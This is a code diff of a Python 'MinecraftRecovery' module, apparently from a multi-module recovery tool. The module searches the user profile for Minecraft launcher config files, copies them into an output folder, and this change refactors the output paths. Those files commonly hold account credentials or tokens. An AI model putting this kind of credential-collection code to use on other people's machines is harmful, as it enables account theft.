@@ -6,7 +6,7 @@ from config import ModuleManager, Constant
 
 class MinecraftRecovery(ModuleManager):
     def __init__(self) -> None:
-        super().__init__(module_name = "MinecraftRecovery")
+        super().__init__(module_name = "MinecraftRecovery", module_path="applications/minecraft")
         
         self.banner(r"""
      _______          __   __   _                                   ____  _   
@@ -18,10 +18,6 @@ class MinecraftRecovery(ModuleManager):
   |:::::::::::|\    
   `-=========-`()               Recover lost minecraft accounts
                     """)
-
-        self.minecraft_folder = self.output_folder_user / 'applications' / 'minecraft'
-
-        self.minecraft_folder.mkdir(parents=True, exist_ok=True)
 
         self.minecraftInstallations = {
             "Intent": os.path.join(Constant.userprofile_dir, "intentlauncher", "launcherconfig"),
@@ -46,11 +42,11 @@ class MinecraftRecovery(ModuleManager):
             if os.path.isfile(path):
                 self.mdebug(f"[{name}] Found Minecraft installation at: {path}")
                 try:
-                    shutil.copy(path, self.output_folder)
-                    self.mprint(f"[{name}] Saved Minecraft installation to {self.output_folder}")
+                    shutil.copy(path, self.module_output)
+                    self.mprint(f"[{name}] Saved Minecraft installation to {self.module_output}")
                     totalDone += 1
                 except Exception as e:
-                    self.merror(f"[{name}] Unable to copy {path} to {self.output_folder} -> {e}")
+                    self.merror(f"[{name}] Unable to copy {path} to {self.module_output} -> {e}")
             else:
                 self.mdebug(f"[{name}] Unable to find Minecraft installation at: {path}")
         
